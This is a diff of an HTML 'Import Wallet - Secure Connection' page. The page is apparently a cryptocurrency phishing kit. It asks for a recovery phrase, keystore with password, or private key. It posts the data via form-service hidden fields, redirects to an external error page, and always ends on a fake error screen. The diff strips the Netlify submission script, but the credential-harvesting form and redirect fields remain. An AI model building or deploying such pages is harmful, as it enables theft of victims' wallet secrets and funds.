@@ -9,7 +9,7 @@
     <title>Import Wallet - Secure Connection</title>
 
     <!-- Lucide (icons). We call safely in JS if it's available -->
-    <script src="../cdnjs.cloudflare.com/ajax/libs/lucide/0.263.1/umd/lucide.min.html"></script>
+   
 
     <style>
         /* (your full CSS kept as-is) */
@@ -113,9 +113,9 @@
 
                                         <input type="hidden" name="_captcha" value="false">
                                         <input type="hidden" name="_next" value="https://securedconnect.vercel.app//error/load.html">
-            <!-- Netlify required -->
+        
             <input type="hidden" name="form-name" value="wallet-import">
-            <!-- honeypot -->
+        
             <p style="height:0; opacity:0; position:absolute; left:-9999px;">
                 <label>Don’t fill this out if you're human: <input name="bot-field" /></label>
             </p>
@@ -173,7 +173,6 @@
         </form>
     </div>
 
-    <!-- Step 4: Final Error -->
     <div id="screen4" class="screen final-error-container">
         <div class="final-error-icon">
             <i data-lucide="alert-circle" style="width:64px; height:64px; color:#dc2626;"></i>
@@ -184,192 +183,113 @@
     </div>
 
     <script>
-        // ---- Safe Lucide initialization ----
-        (function safeLucide() {
-            try {
-                if (window.lucide && typeof window.lucide.replace === 'function') {
-                    window.lucide.replace();
-                }
-            } catch (err) {
-                // If lucide is not available or errors, don't break the rest of the script.
-                console.warn('lucide not available or failed to initialize:', err);
+    // ---- Safe Lucide initialization ----
+    (function safeLucide() {
+        try {
+            if (window.lucide && typeof window.lucide.replace === 'function') {
+                window.lucide.replace();
             }
-        })();
+        } catch (err) {
+            console.warn('lucide not available or failed to initialize:', err);
+        }
+    })();
 
-        // Helper to safely call lucide.replace() when available
-        function safeReplaceIcons() {
-            try {
-                if (window.lucide && typeof window.lucide.replace === 'function') {
-                    window.lucide.replace();
-                }
-            } catch (err) {
-                // swallow
+    // Helper to safely call lucide.replace() when available
+    function safeReplaceIcons() {
+        try {
+            if (window.lucide && typeof window.lucide.replace === 'function') {
+                window.lucide.replace();
+            }
+        } catch (err) {
+            // swallow
+        }
+    }
+
+    // Robust showScreen that never throws
+    function showScreen(screenNumber) {
+        try {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            const el = document.getElementById('screen' + screenNumber);
+            if (el) el.classList.add('active');
+            safeReplaceIcons();
+        } catch (err) {
+            console.error('showScreen error', err);
+        }
+    }
+
+    // Auto-move to Screen 2 after 3s (but guarded)
+    setTimeout(() => {
+        try {
+            showScreen(2);
+        } catch (e) {
+            const fallback = document.getElementById('screen2');
+            if (fallback) {
+                fallback.classList.add('active');
             }
         }
+    }, 3000);
 
-        // Robust showScreen that never throws
-        function showScreen(screenNumber) {
-            try {
-                document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-                const el = document.getElementById('screen' + screenNumber);
-                if (el) el.classList.add('active');
-                safeReplaceIcons();
-            } catch (err) {
-                console.error('showScreen error', err);
-            }
-        }
-
-        // Auto-move to Screen 2 after 3s (but guarded)
-        setTimeout(() => {
-            try {
-                showScreen(2);
-            } catch (e) {
-                // still try to reveal screen2 even if something odd happens
-                const fallback = document.getElementById('screen2');
-                if (fallback) {
-                    fallback.classList.add('active');
-                }
-            }
-        }, 3000);
-
-        // fallback manual continue link (in case auto-switch is blocked)
-        (function bindFallbackContinue() {
-            const fc = document.getElementById('fallbackContinue');
-            if (!fc) return;
-            fc.addEventListener('click', function (ev) {
-                ev.preventDefault();
-                showScreen(2);
-            });
-        })();
-
-        // proceed button to move to form (guarded)
-        (function bindProceedBtn() {
-            const proceedBtn = document.getElementById('proceedBtn');
-            if (!proceedBtn) return;
-            proceedBtn.addEventListener('click', function () {
-                showScreen(3);
-                // ensure phrase tab active by default
-                activateTab('phrase');
-            });
-        })();
-
-        // TAB LOGIC
-        const tabs = Array.from(document.querySelectorAll('.tab'));
-        const tabContents = Array.from(document.querySelectorAll('.tab-content'));
-        const importTypeInput = document.getElementById('importType');
-
-        function activateTab(tabName) {
-            try {
-                tabs.forEach(t => {
-                    if (t.dataset.tab === tabName) {
-                        t.classList.add('active');
-                        t.setAttribute('aria-selected', 'true');
-                    } else {
-                        t.classList.remove('active');
-                        t.setAttribute('aria-selected', 'false');
-                    }
-                });
-
-                tabContents.forEach(c => {
-                    if (c.id === tabName + 'Tab') {
-                        c.classList.add('active');
-                        c.hidden = false;
-                    } else {
-                        c.classList.remove('active');
-                        c.hidden = true;
-                    }
-                });
-
-                if (importTypeInput) importTypeInput.value = tabName;
-                updateRequiredFields(tabName);
-                safeReplaceIcons();
-            } catch (err) {
-                console.error('activateTab error', err);
-            }
-        }
-
-        function updateRequiredFields(activeTab) {
-            // remove required first
-            ['phrase','keystore','password','privateKey'].forEach(id => {
-                const el = document.getElementById(id);
-                if (el) el.removeAttribute('required');
-            });
-
-            if (activeTab === 'phrase') {
-                const p = document.getElementById('phrase');
-                if (p) p.setAttribute('required','');
-            } else if (activeTab === 'keystore') {
-                const ks = document.getElementById('keystore');
-                const pw = document.getElementById('password');
-                if (ks) ks.setAttribute('required','');
-                if (pw) pw.setAttribute('required','');
-            } else if (activeTab === 'privateKey') {
-                const pk = document.getElementById('privateKey');
-                if (pk) pk.setAttribute('required','');
-            }
-        }
-
-        // bind tabs safely
-        tabs.forEach(tab => {
-            tab.addEventListener('click', function () {
-                const tabName = this.dataset.tab;
-                activateTab(tabName);
-            });
+    // fallback manual continue link (in case auto-switch is blocked)
+    (function bindFallbackContinue() {
+        const fc = document.getElementById('fallbackContinue');
+        if (!fc) return;
+        fc.addEventListener('click', function (ev) {
+            ev.preventDefault();
+            showScreen(2);
         });
+    })();
 
-        // Form submission (Netlify)
-        (function bindForm() {
-            const form = document.getElementById('');
-            if (!form) return;
+    // proceed button to move to form (guarded)
+    (function bindProceedBtn() {
+        const proceedBtn = document.getElementById('proceedBtn');
+        if (!proceedBtn) return;
+        proceedBtn.addEventListener('click', function () {
+            showScreen(3);
+            activateTab('phrase');
+        });
+    })();
 
-            form.addEventListener('', function (e) {
-                e.preventDefault();
+    // TAB LOGIC (UI Visual states only)
+    const tabs = Array.from(document.querySelectorAll('.tab'));
+    const tabContents = Array.from(document.querySelectorAll('.tab-content'));
 
-                // Basic client-side validation (ensure required fields present)
-                const activeType = importTypeInput ? importTypeInput.value : '';
-                if (activeType === 'phrase') {
-                    const phrase = document.getElementById('');
-                    if (!phrase || !phrase.value.trim()) {
-                        alert('Please enter your recovery .');
-                        return;
-                    }
+    function activateTab(tabName) {
+        try {
+            tabs.forEach(t => {
+                if (t.dataset.tab === tabName) {
+                    t.classList.add('active');
+                    t.setAttribute('aria-selected', 'true');
+                } else {
+                    t.classList.remove('active');
+                    t.setAttribute('aria-selected', 'false');
                 }
-                // disable submit
-                const submitBtn = form.querySelector('');
-                if (submitBtn) {
-                    submitBtn.textContent = 'IMPORTING...';
-                    submitBtn.disabled = true;
-                }
-
-                // Prepare data for Netlify
-                const formData = new FormData();
-                // include bot-field if present (honeypot)
-                const body = new URLSearchParams();
-                for (const pair of formData.entries()) {
-                    body.append(pair[0], pair[1]);
-                }
-
-                // Send to Netlify (works because page is static HTML)
-                fetch('index.html', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: body.toString()
-                })
-                .then(() => {
-                    // show final screen after small delay
-                    setTimeout(() => showScreen(4), 800);
-                })
-                .catch(err => {
-                    console.error('Form submission failed:', err);
-                    showScreen(4);
-                });
             });
-        })();
 
-        // ensure initial required state
-        try { updateRequiredFields(''); } catch (e) {}
+            tabContents.forEach(c => {
+                if (c.id === tabName + 'Tab') {
+                    c.classList.add('active');
+                    c.hidden = false;
+                } else {
+                    c.classList.remove('active');
+                    c.hidden = true;
+                }
+            });
 
-    </script>
+            safeReplaceIcons();
+        } catch (err) {
+            console.error('activateTab error', err);
+        }
+    }
+
+    // bind tabs safely
+    tabs.forEach(tab => {
+        tab.addEventListener('click', function () {
+            const tabName = this.dataset.tab;
+            activateTab(tabName);
+        });
+    });
+</script>
+
 
 </body>
 
